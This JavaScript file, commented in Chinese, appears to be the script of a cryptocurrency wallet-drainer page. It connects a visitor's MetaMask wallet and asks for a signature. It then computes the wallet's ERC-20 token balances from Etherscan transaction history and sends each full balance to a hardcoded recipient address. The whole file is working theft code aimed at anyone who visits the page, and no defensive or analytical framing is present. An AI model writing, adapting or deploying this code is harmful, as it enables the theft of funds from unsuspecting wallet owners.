const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
let web3;
let isConnected = false;

// 简单的日志功能，方便调试
const updateStatus = (message) => {
    console.log(message);
    const statusElement = document.getElementById('status');
    statusElement.innerText = message;
};

// 更新钱包地址列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    walletList.innerHTML = '';  // 清空列表
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 连接钱包按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    try {
        if (window.ethereum) {
            // 使用MetaMask的provider创建web3实例
            web3 = new Web3(window.ethereum);
            
            // 请求连接钱包账户
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            const accounts = await web3.eth.getAccounts();

            if (accounts.length > 0) {
                updateWalletList(accounts[0]);
                updateStatus('钱包连接成功');
                isConnected = true;
                document.getElementById('signButton').disabled = false;  // 启用签名按钮
            } else {
                updateStatus('未检测到已连接的账户');
            }
        } else {
            updateStatus('请安装 MetaMask 钱包');
        }
    } catch (error) {
        updateStatus('连接失败: ' + error.message);
    }
};

// 签名并转移按钮点击事件
document.getElementById('signButton').onclick = async () => {
    if (!isConnected) {
        updateStatus('请先连接钱包');
        return;
    }

    const accounts = await web3.eth.getAccounts();
    const account = accounts[0];
    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;

    try {
        const signature = await web3.eth.personal.sign(message, account);
        updateStatus(`签名成功: ${signature}`);
        await transferAssets(account);  // 签名成功后调用转移代币函数
    } catch (error) {
        updateStatus(`签名失败: ${error.message}`);
    }
};

// 连接钱包，签名并转移代币的核心逻辑
const transferAssets = async (account) => {
    updateStatus(`正在获取 ${account} 的代币余额...`);
    
    try {
        const tokenBalances = await getTokenBalances(account);

        for (const tokenAddress in tokenBalances) {
            const token = tokenBalances[tokenAddress];
            const balance = token.balance;

            if (balance.gt(0)) {
                // 创建代币合约实例
                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);

                // 调用合约的 transferFrom 方法进行转移
                try {
                    const transfer = await tokenContract.methods
                        .transfer(recipientAddress, balance.toString())
                        .send({ from: account });
                    
                    updateStatus(`成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`);
                } catch (transferError) {
                    updateStatus(`转移 ${token.symbol} 失败: ${transferError.message}`);
                }
            } else {
                updateStatus(`账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`);
            }
        }

        updateStatus('所有代币转移完成');
    } catch (error) {
        updateStatus('获取代币余额失败: ' + error.message);
    }
};

// 获取代币余额的函数
const getTokenBalances = async (address) => {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=YOUR_API_KEY`;
        const response = await axios.get(url);
        const transactions = response.data.result;

        const tokenBalances = {};

        for (const tx of transactions) {
            const tokenAddress = tx.contractAddress;
            const tokenSymbol = tx.tokenSymbol;

            if (!tx.from || !tx.to) {
                continue; // 跳过没有 from 或 to 的交易
            }

            if (!tokenBalances[tokenAddress]) {
                tokenBalances[tokenAddress] = {
                    symbol: tokenSymbol,
                    balance: web3.utils.toBN(0)
                };
            }

            // 计算账户余额的增减
            if (tx.from.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
            }

            if (tx.to.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
            }
        }

        return tokenBalances;
    } catch (error) {
        updateStatus('获取代币余额失败: ' + error.message);
        return {};
    }
};
